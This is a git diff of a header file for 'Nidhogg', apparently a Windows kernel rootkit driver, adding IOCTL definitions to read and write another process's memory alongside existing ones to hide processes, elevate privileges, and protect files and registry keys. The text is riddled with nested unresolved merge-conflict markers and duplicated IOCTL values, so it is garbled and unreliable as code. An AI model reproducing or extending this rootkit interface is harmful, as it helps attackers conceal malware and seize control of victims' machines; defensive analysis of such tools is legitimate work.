@@ -15,17 +15,20 @@
 #define IOCTL_NIDHOGG_PROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_CLEAR_PROCESS_SPOOFING CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_HIDE_PROCESS CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_ELEVATE_PROCESS CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_QUERY_PROTECTED_PROCESSES CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_HIDE_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_ELEVATE_PROCESS CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_QUERY_PROTECTED_PROCESSES CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> afd6daf (Nidhogg v0.2)
 #define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_QUERY_FILES CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
+<<<<<<< HEAD
 
 <<<<<<< HEAD
 #define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -68,14 +71,22 @@
 #define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_QUERY_FILES CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
+=======
+>>>>>>> afd6daf (Nidhogg v0.2)
 
-#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
+<<<<<<< HEAD
 #define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)
 >>>>>>> 7cf740a (Added execution with partial functionality)
+=======
+#define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_WRITE_DATA CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_READ_DATA CTL_CODE(0x8000, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
+>>>>>>> afd6daf (Nidhogg v0.2)
 // *****************************************************************************************************
 
 #define MAX_PATCHED_MODULES 256
@@ -115,11 +126,12 @@ typedef PPEB(NTAPI* tPsGetProcessPeb)(
 PVOID RegistrationHandle = NULL;
 
 struct EnabledFeatures {
-	bool FunctionPatching  = true;
-	bool RegistryFeatures  = true;
-	bool PPIDSpoofing	   = true;
-	bool ProcessProtection = true;
-	bool FileProtection	   = true;
+	bool FunctionPatching   = true;
+	bool WriteData			= true;
+	bool ReadData			= true;
+	bool RegistryFeatures	= true;
+	bool ProcessProtection	= true;
+	bool FileProtection		= true;
 };
 EnabledFeatures Features;
 
@@ -148,30 +160,25 @@ struct PatchedModule {
 	CHAR* FunctionName;
 	WCHAR* ModuleName;
 };
+
+struct PkgReadWriteData {
+	MODE Mode;
+	ULONG Pid;
+	SIZE_T Size;
+	PVOID LocalAddress;
+	PVOID RemoteAddress;
+};
 // ----------------------------------------------------------------------------
 
 // --- ProcessUtils structs ---------------------------------------------------
-struct Process {
-	int type;
-	ULONG ProcessPid;
-	ULONG SpoofedPid;
-};
-
-struct SpoofedProcessesList {
-	int PidsCount;
-	FastMutex Lock;
-	Process* Processes[MAX_PIDS];
-};
-
 struct ProcessesList {
 	int PidsCount;
-	FastMutex Lock;
 	ULONG Processes[MAX_PIDS];
 };
 
 struct ProcessGlobals {
 	ProcessesList ProtectedProcesses;
-	SpoofedProcessesList SpoofedProcesses;
+	FastMutex Lock;
 
 	void Init() {
 <<<<<<< HEAD
@@ -193,6 +200,7 @@ struct ProcessGlobals {
 >>>>>>> ffc9bcf (Seperated hidden and protected registry items.)
 =======
 		ProtectedProcesses.PidsCount = 0;
+<<<<<<< HEAD
 		SpoofedProcesses.PidsCount = 0;
 <<<<<<< HEAD
 >>>>>>> 39effc7 (PPID Spoofing initial)
@@ -201,6 +209,9 @@ struct ProcessGlobals {
 		ProtectedProcesses.Lock.Init();
 		SpoofedProcesses.Lock.Init();
 >>>>>>> 7cf740a (Added execution with partial functionality)
+=======
+		Lock.Init();
+>>>>>>> db67c98 (Reverted PPID spoofing)
 	}
 };
 ProcessGlobals pGlobals;
